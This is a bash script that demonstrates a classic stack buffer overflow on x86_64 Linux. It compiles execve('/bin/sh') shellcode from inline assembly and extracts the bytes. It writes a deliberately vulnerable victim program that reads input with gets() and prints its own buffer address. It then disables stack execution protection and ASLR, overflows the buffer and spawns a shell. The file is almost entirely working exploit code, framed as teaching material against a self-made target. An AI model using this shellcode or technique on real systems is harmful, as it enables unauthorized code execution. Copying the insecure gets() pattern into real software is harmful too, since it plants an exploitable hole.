#!/bin/bash

# Demonstrates a classic buffer overflow exploit.
# Works on Arch on x86_64

origdir=$(pwd)
tmpdir=$(mktemp -d)
cd $tmpdir

# C program wrapping position-independent assembly that launches a shell!
echo compiling shell launcher...

cat > launch.c << "EOF"
int main(int argc, char **argv) {
    asm(
        "needle0: jmp there\n"
        "here: pop %rdi\n"
        "xor %rax, %rax\n"
        "movb $0x3b, %al\n"
        "xor %rsi, %rsi\n"
        "xor %rdx, %rdx\n"
        "syscall\n"
        "there: call here\n"
        ".string \"/bin/sh\"\n"
        "needle1: .octa 0xdeadbeef\n"
    );
}
EOF
gcc -o launch launch.c


# Extract the machine code into a file named "shellcode".
echo extracting shellcode from objdump...

addr=0x$(objdump -d launch | grep needle0 | cut -d ' '  -f1)
addr=$((addr-0x400000))
echo ...shellcode starts at offset $addr

endaddr=0x$(objdump -d launch | grep needle1 | cut -d ' '  -f1)
endaddr=$((endaddr-0x400000))

# I added the bytes computation. It's usually 32, but this lets us deal
# with variable length shellcode. The effect of the bytes computation is
# to round-up to the nearest multiple of 8.
rawsize=$((endaddr-addr))
bytes=$((rawsize + 8-(rawsize % 8)))
xxd -s $addr -l $bytes -p launch > shellcode

# Here's the victim program. It conveniently prints the buffer address.

echo compiling victim...
cat > victim.c << "EOF"
#include <stdio.h>
int main() {
    char name[64];
    printf("%p\n", name);  // Print address of buffer.
    puts("What's your name?");
    gets(name);
    printf("Hello, %s!\n", name);
    return 0;
}
EOF

# cat victim.c
# gcc -fno-stack-protector -o victim victim.c
gcc -o victim victim.c 2>/dev/null

echo disabling executable space protection...
execstack -s victim     # `pacman -S prelink` to get execstack
echo finding buffer address...
addr=$(echo | setarch x86_64 -R ./victim | sed 1q)
echo ...name[64] starts at $addr
echo exploiting victim...
a=$(printf %016x $addr | tac -rs..)

# Attack! Overflow the buffer to start a shell.
# Hit Enter a few times, then enter commands.

# To see how the cat part of this works, type "cat | bash" at a terminal
( ( cat shellcode ; printf %080d ; echo $a ) | xxd -r -p ; cat ) \
    | setarch x86_64 -R ./victim

# Clean up temp dir.

echo removing temp dir...
cd $origdir
rm -r $tmpdir
